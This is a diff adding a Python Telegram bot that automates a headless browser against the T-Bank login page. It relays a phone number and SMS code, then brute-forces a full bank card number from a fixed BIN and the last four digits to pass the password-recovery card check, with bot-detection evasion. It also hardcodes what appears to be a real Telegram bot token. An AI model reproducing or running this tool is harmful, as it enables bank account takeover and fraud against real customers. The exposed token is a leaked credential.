@@ -1,0 +1,386 @@
+import logging
+import threading
+import time
+from enum import Enum
+from typing import Dict, Optional
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
+from telegram import Update, Bot
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+from telegram.ext import ConversationHandler
+
+# Enable logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Define states for conversation
+class State(Enum):
+    WAITING_PHONE = 1
+    WAITING_SMS = 2
+    WAITING_LAST4 = 3
+    BRUTE_FORCE = 4
+
+# User session data structure
+class UserSession:
+    def __init__(self, user_id: int):
+        self.user_id = user_id
+        self.state = State.WAITING_PHONE
+        self.phone = ""
+        self.driver = None
+        self.last4 = ""
+        self.bin = "220070"
+        self.current_candidate = 0
+        self.found_card = None
+        self.brute_force_thread = None
+        self.stop_brute_force = False
+
+# Store user sessions
+user_sessions: Dict[int, UserSession] = {}
+
+# Telegram Bot Token (replace with your token)
+TOKEN = "8163066452:AAGc_n0x--A0xtmCdVwp5NGZLsCi5qFC0_I"
+
+# T-Bank URLs
+LOGIN_URL = "https://id.tbank.ru/auth/step?cid=vuScwCCJhyGa"
+
+# Luhn algorithm implementation
+def luhn_check_15(s: str) -> int:
+    """Calculate Luhn check digit for 15-digit string"""
+    s_rev = s[::-1]
+    total = 0
+    for i, char in enumerate(s_rev):
+        digit = int(char)
+        if i % 2 == 0:
+            doubled = digit * 2
+            total += doubled // 10 + doubled % 10
+        else:
+            total += digit
+    return (10 - (total % 10)) % 10
+
+def start_browser_session(session: UserSession):
+    """Start a headless Chrome browser session"""
+    options = webdriver.ChromeOptions()
+    options.add_argument('--headless')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    options.add_experimental_option('useAutomationExtension', False)
+    
+    session.driver = webdriver.Chrome(options=options)
+    session.driver.get(LOGIN_URL)
+    time.sleep(2)
+
+def enter_phone_number(session: UserSession):
+    """Enter phone number on T-Bank login page"""
+    try:
+        phone_input = WebDriverWait(session.driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='tel']"))
+        )
+        phone_input.clear()
+        # Remove + from phone number for input
+        phone_to_enter = session.phone.lstrip('+')
+        phone_input.send_keys(phone_to_enter)
+        
+        continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+        continue_btn.click()
+        time.sleep(2)
+        return True
+    except Exception as e:
+        logger.error(f"Error entering phone number: {e}")
+        return False
+
+def enter_sms_code(session: UserSession, code: str):
+    """Enter SMS code on T-Bank page"""
+    try:
+        code_input = WebDriverWait(session.driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']"))
+        )
+        code_input.clear()
+        code_input.send_keys(code)
+        
+        continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+        continue_btn.click()
+        time.sleep(3)
+        
+        # Check if password page appears
+        try:
+            forgot_pass_btn = session.driver.find_element(By.XPATH, "//button[contains(text(), 'Не помню пароль')]")
+            forgot_pass_btn.click()
+            time.sleep(2)
+        except NoSuchElementException:
+            pass
+        
+        # Wait for card number input page
+        WebDriverWait(session.driver, 10).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']"))
+        )
+        return True
+    except Exception as e:
+        logger.error(f"Error entering SMS code: {e}")
+        return False
+
+def try_card_number(session: UserSession, card_number: str) -> bool:
+    """Try a card number on T-Bank page and check if successful"""
+    try:
+        # Find card number input
+        card_input = session.driver.find_element(By.CSS_SELECTOR, "input[type='text'][inputmode='numeric']")
+        card_input.clear()
+        card_input.send_keys(card_number)
+        
+        # Click continue
+        continue_btn = session.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+        continue_btn.click()
+        
+        # Wait and check for redirect
+        time.sleep(5)
+        current_url = session.driver.current_url
+        
+        # Check if URL changed (successful redirect)
+        if "step" in current_url and current_url != LOGIN_URL:
+            # Additional check for account page elements
+            page_source = session.driver.page_source
+            if "счет" in page_source.lower() or "баланс" in page_source.lower():
+                return True
+        return False
+    except Exception as e:
+        logger.error(f"Error trying card number {card_number}: {e}")
+        return False
+
+def brute_force_worker(session: UserSession, bot: Bot):
+    """Worker thread for brute-forcing card numbers"""
+    try:
+        for candidate in range(session.current_candidate, 1000000):
+            if session.stop_brute_force:
+                break
+                
+            candidate_str = str(candidate).zfill(6)
+            first_15 = session.bin + candidate_str + session.last4[:3]
+            
+            # Check Luhn validation
+            if luhn_check_15(first_15) == int(session.last4[3]):
+                full_card = session.bin + candidate_str + session.last4
+                
+                # Try the card number
+                if try_card_number(session, full_card):
+                    session.found_card = full_card
+                    session.stop_brute_force = True
+                    
+                    # Send success message
+                    bot.send_message(
+                        chat_id=session.user_id,
+                        text=f"✅ Успех! Найдена карта: {full_card}"
+                    )
+                    
+                    # Close browser
+                    if session.driver:
+                        session.driver.quit()
+                    return
+            
+            # Update progress every 1000 candidates
+            if candidate % 1000 == 0:
+                progress = (candidate / 1000000) * 100
+                bot.send_message(
+                    chat_id=session.user_id,
+                    text=f"⏳ Прогресс: {progress:.1f}% (проверено {candidate} комбинаций)"
+                )
+            
+            time.sleep(10)  # Wait between attempts to avoid rate limiting
+            
+            session.current_candidate = candidate + 1
+        
+        # If loop completes without finding
+        bot.send_message(
+            chat_id=session.user_id,
+            text="❌ Не удалось найти подходящую карту. Попробуйте с другими данными."
+        )
+        
+    except Exception as e:
+        logger.error(f"Error in brute force worker: {e}")
+        bot.send_message(
+            chat_id=session.user_id,
+            text=f"❌ Ошибка в процессе подбора: {str(e)}"
+        )
+    finally:
+        # Cleanup
+        if session.driver:
+            session.driver.quit()
+        if session.user_id in user_sessions:
+            del user_sessions[session.user_id]
+
+# Telegram bot handlers
+def start(update: Update, context: CallbackContext) -> int:
+    """Start the conversation and ask for phone number"""
+    user_id = update.effective_user.id
+    
+    if user_id in user_sessions:
+        update.message.reply_text("❌ У вас уже есть активная сессия. Закончите текущую.")
+        return ConversationHandler.END
+    
+    session = UserSession(user_id)
+    user_sessions[user_id] = session
+    
+    update.message.reply_text(
+        "👋 Добро пожаловать! Отправьте номер телефона в формате +79999999999"
+    )
+    return State.WAITING_PHONE.value
+
+def receive_phone(update: Update, context: CallbackContext) -> int:
+    """Receive phone number and start browser session"""
+    user_id = update.effective_user.id
+    if user_id not in user_sessions:
+        update.message.reply_text("❌ Сессия не найдена. Начните с /start")
+        return ConversationHandler.END
+    
+    session = user_sessions[user_id]
+    phone = update.message.text.strip()
+    
+    # Validate phone number format
+    if not phone.startswith('+7') or len(phone) != 12:
+        update.message.reply_text("❌ Неверный формат номера. Используйте +79999999999")
+        return State.WAITING_PHONE.value
+    
+    session.phone = phone
+    
+    # Start browser session
+    update.message.reply_text("🔄 Запускаю браузер...")
+    try:
+        start_browser_session(session)
+        if enter_phone_number(session):
+            update.message.reply_text(
+                "✅ Номер введен. Теперь отправьте SMS код, который пришел на телефон:"
+            )
+            session.state = State.WAITING_SMS
+            return State.WAITING_SMS.value
+        else:
+            update.message.reply_text("❌ Ошибка при вводе номера. Попробуйте еще раз.")
+            return State.WAITING_PHONE.value
+    except Exception as e:
+        logger.error(f"Error starting browser: {e}")
+        update.message.reply_text(f"❌ Ошибка: {str(e)}")
+        return ConversationHandler.END
+
+def receive_sms(update: Update, context: CallbackContext) -> int:
+    """Receive SMS code and proceed to card entry"""
+    user_id = update.effective_user.id
+    if user_id not in user_sessions:
+        update.message.reply_text("❌ Сессия не найдена. Начните с /start")
+        return ConversationHandler.END
+    
+    session = user_sessions[user_id]
+    sms_code = update.message.text.strip()
+    
+    # Validate SMS code
+    if not sms_code.isdigit() or len(sms_code) != 4:
+        update.message.reply_text("❌ Неверный формат кода. Отправьте 4 цифры.")
+        return State.WAITING_SMS.value
+    
+    update.message.reply_text("🔄 Ввожу код...")
+    try:
+        if enter_sms_code(session, sms_code):
+            update.message.reply_text(
+                "✅ Код принят. Теперь отправьте последние 4 цифры карты:"
+            )
+            session.state = State.WAITING_LAST4
+            return State.WAITING_LAST4.value
+        else:
+            update.message.reply_text("❌ Ошибка при вводе кода. Попробуйте еще раз.")
+            return State.WAITING_SMS.value
+    except Exception as e:
+        logger.error(f"Error entering SMS: {e}")
+        update.message.reply_text(f"❌ Ошибка: {str(e)}")
+        return ConversationHandler.END
+
+def receive_last4(update: Update, context: CallbackContext) -> int:
+    """Receive last 4 digits and start brute force"""
+    user_id = update.effective_user.id
+    if user_id not in user_sessions:
+        update.message.reply_text("❌ Сессия не найдена. Начните с /start")
+        return ConversationHandler.END
+    
+    session = user_sessions[user_id]
+    last4 = update.message.text.strip()
+    
+    # Validate last 4 digits
+    if not last4.isdigit() or len(last4) != 4:
+        update.message.reply_text("❌ Неверный формат. Отправьте 4 цифры.")
+        return State.WAITING_LAST4.value
+    
+    session.last4 = last4
+    
+    update.message.reply_text(
+        f"🔍 Начинаю подбор карты с последними цифрами {last4}...\n"
+        f"Это займет некоторое время (примерно 10 минут)."
+    )
+    
+    # Start brute force in separate thread
+    session.brute_force_thread = threading.Thread(
+        target=brute_force_worker,
+        args=(session, context.bot)
+    )
+    session.brute_force_thread.start()
+    
+    session.state = State.BRUTE_FORCE
+    return State.BRUTE_FORCE.value
+
+def cancel(update: Update, context: CallbackContext) -> int:
+    """Cancel the current operation"""
+    user_id = update.effective_user.id
+    if user_id in user_sessions:
+        session = user_sessions[user_id]
+        session.stop_brute_force = True
+        
+        if session.driver:
+            session.driver.quit()
+        
+        del user_sessions[user_id]
+    
+    update.message.reply_text("❌ Операция отменена.")
+    return ConversationHandler.END
+
+def error_handler(update: Update, context: CallbackContext):
+    """Handle errors"""
+    logger.error(f"Update {update} caused error {context.error}")
+    if update and update.effective_message:
+        update.effective_message.reply_text("❌ Произошла ошибка. Попробуйте еще раз.")
+
+def main():
+    """Start the bot"""
+    updater = Updater(TOKEN)
+    dispatcher = updater.dispatcher
+    
+    # Create conversation handler
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('start', start)],
+        states={
+            State.WAITING_PHONE.value: [
+                MessageHandler(Filters.text & ~Filters.command, receive_phone)
+            ],
+            State.WAITING_SMS.value: [
+                MessageHandler(Filters.text & ~Filters.command, receive_sms)
+            ],
+            State.WAITING_LAST4.value: [
+                MessageHandler(Filters.text & ~Filters.command, receive_last4)
+            ],
+            State.BRUTE_FORCE.value: [
+                MessageHandler(Filters.text & ~Filters.command, 
+                             lambda update, context: update.message.reply_text("⏳ Идет подбор карты..."))
+            ],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+    )
+    
+    dispatcher.add_handler(conv_handler)
+    dispatcher.add_error_handler(error_handler)
+    
+    # Start the Bot
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == '__main__':
+    main()
